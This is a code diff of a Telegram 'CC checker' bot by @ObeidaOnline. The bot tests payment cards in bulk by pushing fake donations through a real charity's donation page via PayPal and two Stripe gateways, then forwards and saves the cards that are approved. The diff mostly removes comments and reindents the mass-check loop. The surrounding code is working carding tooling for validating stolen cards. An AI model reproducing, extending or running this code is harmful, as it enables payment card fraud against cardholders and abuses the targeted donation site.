@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Real Multi Gateway CC Checker Bot
-Version: 10.0 - Three Gateways with Mass Check Manager
+Version: 11.0 - Final with Working Progress Bar
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -138,7 +138,6 @@ class DataManager:
     
     @staticmethod
     def init_files():
-        """تهيئة جميع الملفات تلقائياً"""
         if not os.path.exists(USERS_FILE):
             users = {}
             for admin_id in ADMIN_IDS:
@@ -950,8 +949,6 @@ class StripeGateway2:
 
 # ==================== بوابة PayPal ====================
 class PayPalGateway:
-    """PayPal Charge Gateway - awwatersheds.org"""
-    
     FIRST_NAMES = [
         "James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda",
         "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica",
@@ -1026,7 +1023,6 @@ class PayPalGateway:
                 "X-Requested-With": "XMLHttpRequest"
             }
             
-            # Scrape tokens
             r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua_str}, timeout=20)
             html = r.text
             
@@ -1048,7 +1044,6 @@ class PayPalGateway:
                 'id': id_match.group(1)
             }
             
-            # Register donation
             data = {
                 "give-honeypot": "",
                 "give-form-id-prefix": tokens['pfx'],
@@ -1074,7 +1069,6 @@ class PayPalGateway:
             if r.status_code != 200:
                 return False, "❌ Donation registration failed"
             
-            # Create order
             data = {
                 "give-honeypot": "",
                 "give-form-id-prefix": tokens['pfx'],
@@ -1095,7 +1089,6 @@ class PayPalGateway:
             
             order_id = order_data["data"]["id"]
             
-            # Charge card
             addr = donor["address"]
             full_yy = card_data['year'] if len(card_data['year']) == 4 else "20" + card_data['year']
             
@@ -1197,7 +1190,6 @@ class PayPalGateway:
             )
             paypal_text = r.text
             
-            # Approve order
             data = {
                 "give-honeypot": "",
                 "give-form-id-prefix": tokens['pfx'],
@@ -1214,7 +1206,6 @@ class PayPalGateway:
                 headers=ajax_headers, data=data, timeout=30
             )
             
-            # Analyze response
             t = paypal_text.upper()
             
             if 'APPROVESTATE":"APPROVED' in t:
@@ -1270,19 +1261,15 @@ class RealGateways:
 
 # ==================== مدير الفحص المتعدد ====================
 class MassCheckManager:
-    """مدير الفحص المتعدد - يتحكم في عمليات الفحص المتعددة"""
-    
     def __init__(self):
-        self.active_checks = {}  # {check_id: check_data}
-        self.user_current_check = {}  # {user_id: check_id}
+        self.active_checks = {}
+        self.user_current_check = {}
     
     def start_check(self, user_id: int, chat_id: int, cards: List[Dict], gate: str, message_id: int = None) -> int:
-        """بدء فحص جديد للمستخدم"""
-        # إذا كان المستخدم لديه فحص نشط، قم بإلغائه أولاً
         if user_id in self.user_current_check:
             self.stop_check(user_id)
         
-        check_id = int(time.time() * 1000)  # معرف فريد
+        check_id = int(time.time() * 1000)
         
         self.active_checks[check_id] = {
             'user_id': user_id,
@@ -1302,7 +1289,6 @@ class MassCheckManager:
         return check_id
     
     def stop_check(self, user_id: int) -> bool:
-        """إيقاف الفحص النشط للمستخدم"""
         if user_id in self.user_current_check:
             check_id = self.user_current_check[user_id]
             if check_id in self.active_checks:
@@ -1311,14 +1297,12 @@ class MassCheckManager:
         return False
     
     def get_check(self, user_id: int) -> Optional[Dict]:
-        """الحصول على بيانات الفحص النشط للمستخدم"""
         if user_id in self.user_current_check:
             check_id = self.user_current_check[user_id]
             return self.active_checks.get(check_id)
         return None
     
     def remove_check(self, user_id: int):
-        """إزالة الفحص بعد الانتهاء"""
         if user_id in self.user_current_check:
             check_id = self.user_current_check[user_id]
             if check_id in self.active_checks:
@@ -1326,25 +1310,11 @@ class MassCheckManager:
             del self.user_current_check[user_id]
     
     def is_checking(self, user_id: int) -> bool:
-        """التحقق مما إذا كان المستخدم يقوم بفحص حاليًا"""
         if user_id in self.user_current_check:
             check_id = self.user_current_check[user_id]
             if check_id in self.active_checks:
                 return not self.active_checks[check_id].get('stop', False)
         return False
-    
-    def get_progress(self, user_id: int) -> Optional[Dict]:
-        """الحصول على تقدم الفحص الحالي"""
-        check = self.get_check(user_id)
-        if check:
-            return {
-                'total': check['total'],
-                'checked': check['checked'],
-                'approved': check['approved'],
-                'declined': check['declined'],
-                'gate': check['gate']
-            }
-        return None
 
 # ==================== واجهة المستخدم ====================
 class UserInterface:
@@ -1510,13 +1480,11 @@ class CommandHandler:
                         parse_mode='HTML', reply_markup=self.ui.main_menu(chat_type))
     
     def handle_stop(self, message):
-        """إيقاف الفحص الحالي للمستخدم"""
         user_id = message.from_user.id
         
         if self.mass_manager.stop_check(user_id):
             bot.reply_to(message, "⛔ <b>تم إيقاف الفحص بنجاح</b>\n\nيمكنك بدء فحص جديد في أي وقت.", parse_mode='HTML')
         else:
-            # التحقق إذا كان هناك فحص نشط
             check = self.mass_manager.get_check(user_id)
             if check:
                 bot.reply_to(message, "⚠️ <b>لا يمكن إيقاف الفحص حالياً</b>\n\nيرجى المحاولة مرة أخرى.", parse_mode='HTML')
@@ -1694,19 +1662,15 @@ class CommandHandler:
             bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", progress_msg.chat.id, progress_msg.message_id)
     
     def check_multiple_cards(self, message, cards: List[Dict], gate: str):
-        """فحص عدة بطاقات متسلسلة"""
         user_id = message.from_user.id
         chat_id = message.chat.id
         
-        # التحقق من وجود فحص نشط
         if self.mass_manager.is_checking(user_id):
             bot.reply_to(message, "⚠️ <b>لديك فحص نشط حالياً!</b>\n\nاستخدم /stop لإيقاف الفحص الحالي أولاً.", parse_mode='HTML')
             return
         
-        # بدء فحص جديد
         check_id = self.mass_manager.start_check(user_id, chat_id, cards, gate, message.message_id)
         
-        # إرسال رسالة بدء الفحص
         start_msg = bot.reply_to(message, f"""
 🚀 <b>بدء الفحص المتسلسل</b> 🚀
 ━━━━━━━━━━━━
@@ -1721,16 +1685,13 @@ class CommandHandler:
 💡 استخدم /stop لإيقاف الفحص
 """, parse_mode='HTML', reply_markup=self.ui.stop_button(check_id))
         
-        # تحديث معرف الرسالة في بيانات الفحص
         check = self.mass_manager.get_check(user_id)
         if check:
             check['message_id'] = start_msg.message_id
         
-        # بدء الفحص في thread منفصل
         threading.Thread(target=self._run_mass_check, args=(user_id,), daemon=True).start()
     
     def _run_mass_check(self, user_id: int):
-        """تشغيل الفحص المتعدد في thread منفصل"""
         try:
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
@@ -1740,67 +1701,37 @@ class CommandHandler:
             print(f"Error in mass check: {e}")
     
     async def _process_mass_check(self, user_id: int):
-    """معالجة الفحص المتعدد - نسخة معدلة بالكامل"""
-    check = self.mass_manager.get_check(user_id)
-    if not check:
-        return
-    
-    cards = check['cards']
-    gate = check['gate']
-    chat_id = check['chat_id']
-    gate_name = GATES[gate]['name']
-    total_cards = len(cards)
-    
-    # قائمة لتخزين النتائج
-    all_results = []
-    
-    # إرسال رسالة البداية
-    progress_msg = await asyncio.get_event_loop().run_in_executor(
-        None,
-        lambda: bot.send_message(
-            chat_id,
-            f"""
-🚀 <b>جاري الفحص المتسلسل</b> 🚀
-━━━━━━━━━━━━
-📊 <b>إجمالي البطاقات:</b> {total_cards}
-🚪 <b>البوابة:</b> {GATES[gate]['icon']} {gate_name}
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
-
-✅ <b>المقبولة:</b> 0
-❌ <b>المرفوضة:</b> 0
-🔄 <b>تم فحص:</b> 0/{total_cards}
-━━━━━━━━━━━━
-💡 استخدم /stop لإيقاف الفحص
-""",
-            parse_mode='HTML',
-            reply_markup=self.ui.stop_button(int(time.time() * 1000))
-        )
-    )
-    
-    # حفظ معرف الرسالة
-    message_id = progress_msg.message_id
-    
-    # فحص كل بطاقة
-    for i, card in enumerate(cards, 1):
-        # التحقق من طلب الإيقاف
         check = self.mass_manager.get_check(user_id)
-        if not check or check.get('stop'):
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.edit_message_text(
-                    f"⛔ <b>تم إيقاف الفحص</b>\n━━━━━━━━━━━━\n✅ المقبولة: {check['approved'] if check else 0}\n❌ المرفوضة: {check['declined'] if check else 0}\n📊 تم فحص: {check['checked'] if check else 0}/{total_cards}",
-                    chat_id,
-                    message_id,
-                    parse_mode='HTML'
-                )
-            )
-            break
+        if not check:
+            return
         
-        try:
-            current_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
+        cards = check['cards']
+        gate = check['gate']
+        chat_id = check['chat_id']
+        gate_name = GATES[gate]['name']
+        total_cards = len(cards)
+        
+        all_results = []
+        message_id = check['message_id']
+        
+        for i, card in enumerate(cards, 1):
+            check = self.mass_manager.get_check(user_id)
+            if not check or check.get('stop'):
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.edit_message_text(
+                        f"⛔ <b>تم إيقاف الفحص</b>\n━━━━━━━━━━━━\n✅ المقبولة: {check['approved'] if check else 0}\n❌ المرفوضة: {check['declined'] if check else 0}\n📊 تم فحص: {check['checked'] if check else 0}/{total_cards}",
+                        chat_id,
+                        message_id,
+                        parse_mode='HTML'
+                    )
+                )
+                break
             
-            # تحديث حالة "جاري الفحص" مع الأرقام الحالية
-            current_progress = f"""
+            try:
+                current_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
+                
+                progress_text = f"""
 🚀 <b>جاري الفحص المتسلسل</b> 🚀
 ━━━━━━━━━━━━
 📊 <b>إجمالي البطاقات:</b> {total_cards}
@@ -1813,41 +1744,37 @@ class CommandHandler:
 ━━━━━━━━━━━━
 💡 استخدم /stop لإيقاف الفحص
 """
-            
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.edit_message_text(
-                    current_progress,
-                    chat_id,
-                    message_id,
-                    parse_mode='HTML',
-                    reply_markup=self.ui.stop_button(int(time.time() * 1000))
+                
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.edit_message_text(
+                        progress_text,
+                        chat_id,
+                        message_id,
+                        parse_mode='HTML',
+                        reply_markup=self.ui.stop_button(int(time.time() * 1000))
+                    )
                 )
-            )
-            
-            # فحص البطاقة
-            approved, resp = await self.gateways.check_card(gate, card)
-            
-            # تحديث الإحصائيات
-            check = self.mass_manager.get_check(user_id)
-            if not check:
-                break
-            
-            check['checked'] += 1
-            
-            # تنسيق نتيجة البطاقة
-            card_result = ResultFormatter.format_card_result(card['original'], resp, approved)
-            all_results.append(card_result)
-            
-            if approved:
-                check['approved'] += 1
                 
-                # إرسال البطاقة المقبولة فوراً
-                number = card['number']
-                masked = f"{number[:6]}xxxxxx{number[-4:]}"
-                bin_info = Helpers.get_bin_info(number[:6])
+                approved, resp = await self.gateways.check_card(gate, card)
                 
-                approved_msg = f"""
+                check = self.mass_manager.get_check(user_id)
+                if not check:
+                    break
+                
+                check['checked'] += 1
+                
+                card_result = ResultFormatter.format_card_result(card['original'], resp, approved)
+                all_results.append(card_result)
+                
+                if approved:
+                    check['approved'] += 1
+                    
+                    number = card['number']
+                    masked = f"{number[:6]}xxxxxx{number[-4:]}"
+                    bin_info = Helpers.get_bin_info(number[:6])
+                    
+                    approved_msg = f"""
 ✅ <b>بطاقة مقبولة</b>
 ━━━━━━━━━━━━
 <b>💳 البطاقة:</b> <code>{card['original']}</code>
@@ -1860,22 +1787,21 @@ class CommandHandler:
 ━━━━━━━━━━━━
 🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
+                    
+                    await asyncio.get_event_loop().run_in_executor(
+                        None,
+                        lambda: bot.send_message(chat_id, approved_msg, parse_mode='HTML')
+                    )
+                    
+                    DataManager.save_card_result(card['original'], gate_name, resp, user_id, True)
+                    
+                else:
+                    check['declined'] += 1
+                    DataManager.save_card_result(card['original'], gate_name, resp, user_id, False)
                 
-                await asyncio.get_event_loop().run_in_executor(
-                    None,
-                    lambda: bot.send_message(chat_id, approved_msg, parse_mode='HTML')
-                )
+                DataManager.update_usage(user_id, gate, resp)
                 
-                DataManager.save_card_result(card['original'], gate_name, resp, user_id, True)
-                
-            else:
-                check['declined'] += 1
-                DataManager.save_card_result(card['original'], gate_name, resp, user_id, False)
-            
-            DataManager.update_usage(user_id, gate, resp)
-            
-            # تحديث التقدم بعد الفحص (عرض الأرقام الجديدة)
-            after_progress = f"""
+                after_progress = f"""
 🚀 <b>جاري الفحص المتسلسل</b> 🚀
 ━━━━━━━━━━━━
 📊 <b>إجمالي البطاقات:</b> {total_cards}
@@ -1888,61 +1814,57 @@ class CommandHandler:
 ━━━━━━━━━━━━
 💡 استخدم /stop لإيقاف الفحص
 """
-            
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.edit_message_text(
-                    after_progress,
-                    chat_id,
-                    message_id,
-                    parse_mode='HTML',
-                    reply_markup=self.ui.stop_button(int(time.time() * 1000))
+                
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.edit_message_text(
+                        after_progress,
+                        chat_id,
+                        message_id,
+                        parse_mode='HTML',
+                        reply_markup=self.ui.stop_button(int(time.time() * 1000))
+                    )
                 )
+                
+                await asyncio.sleep(1.5)
+                
+            except Exception as e:
+                print(f"Error: {e}")
+                check = self.mass_manager.get_check(user_id)
+                if check:
+                    check['checked'] += 1
+                    check['declined'] += 1
+                    card_result = ResultFormatter.format_card_result(card['original'], f"⚠️ خطأ: {str(e)[:30]}", False)
+                    all_results.append(card_result)
+        
+        check = self.mass_manager.get_check(user_id)
+        if check and not check.get('stop'):
+            results_text = ResultFormatter.format_mass_result_header(total_cards, gate_name)
+            results_text += "\n".join(all_results[:50])
+            if len(all_results) > 50:
+                results_text += f"\n\n... و {len(all_results) - 50} نتيجة أخرى"
+            results_text += ResultFormatter.format_mass_result_footer(
+                check['approved'], check['declined'], total_cards, 0
             )
             
-            await asyncio.sleep(1.5)
-            
-        except Exception as e:
-            print(f"Error: {e}")
-            check = self.mass_manager.get_check(user_id)
-            if check:
-                check['checked'] += 1
-                check['declined'] += 1
-                card_result = ResultFormatter.format_card_result(card['original'], f"⚠️ خطأ: {str(e)[:30]}", False)
-                all_results.append(card_result)
-    
-    # انتهاء الفحص - عرض النتائج النهائية
-    check = self.mass_manager.get_check(user_id)
-    if check and not check.get('stop'):
-        # تجميع النتائج النهائية
-        results_text = ResultFormatter.format_mass_result_header(total_cards, gate_name)
-        results_text += "\n".join(all_results[:50])
-        if len(all_results) > 50:
-            results_text += f"\n\n... و {len(all_results) - 50} نتيجة أخرى"
-        results_text += ResultFormatter.format_mass_result_footer(
-            check['approved'], check['declined'], total_cards, 0
-        )
-        
-        # إرسال النتائج النهائية
-        try:
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.edit_message_text(
-                    results_text,
-                    chat_id,
-                    message_id,
-                    parse_mode='HTML'
+            try:
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.edit_message_text(
+                        results_text,
+                        chat_id,
+                        message_id,
+                        parse_mode='HTML'
+                    )
                 )
-            )
-        except Exception as e:
-            print(f"Error editing final message: {e}")
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.send_message(chat_id, results_text, parse_mode='HTML')
-            )
-        
-        # إرسال ملخص
-        summary = f"""
+            except Exception as e:
+                print(f"Error editing final message: {e}")
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.send_message(chat_id, results_text, parse_mode='HTML')
+                )
+            
+            summary = f"""
 ✅ <b>اكتمل الفحص</b>
 ━━━━━━━━━━━━
 📊 إجمالي البطاقات: {total_cards}
@@ -1953,14 +1875,13 @@ class CommandHandler:
 {'📌 تم إرسال البطاقات المقبولة فوراً' if check['approved'] > 0 else '❌ لا توجد بطاقات مقبولة'}
 📁 تم حفظ النتائج في الملفات
 """
+            
+            await asyncio.get_event_loop().run_in_executor(
+                None,
+                lambda: bot.send_message(chat_id, summary, parse_mode='HTML')
+            )
         
-        await asyncio.get_event_loop().run_in_executor(
-            None,
-            lambda: bot.send_message(chat_id, summary, parse_mode='HTML')
-        )
-    
-    # إزالة الفحص من المدير
-    self.mass_manager.remove_check(user_id)
+        self.mass_manager.remove_check(user_id)
     
     def handle_single(self, message, gate):
         if not self.check_sub(message):
@@ -2213,21 +2134,18 @@ def setup():
     @bot.message_handler(commands=['removesub'])
     def removesub(m): handler.handle_remove_sub(m)
     
-    # Stripe v1 commands
     @bot.message_handler(commands=['st1'])
     def stripe1(m): handler.handle_single(m, 'stripe1')
     
     @bot.message_handler(commands=['st1m'])
     def stripe1_mass(m): handler.handle_mass(m, 'stripe1')
     
-    # Stripe v2 commands
     @bot.message_handler(commands=['st2'])
     def stripe2(m): handler.handle_single(m, 'stripe2')
     
     @bot.message_handler(commands=['st2m'])
     def stripe2_mass(m): handler.handle_mass(m, 'stripe2')
     
-    # PayPal commands
     @bot.message_handler(commands=['pay'])
     def paypal(m): handler.handle_single(m, 'paypal')
     
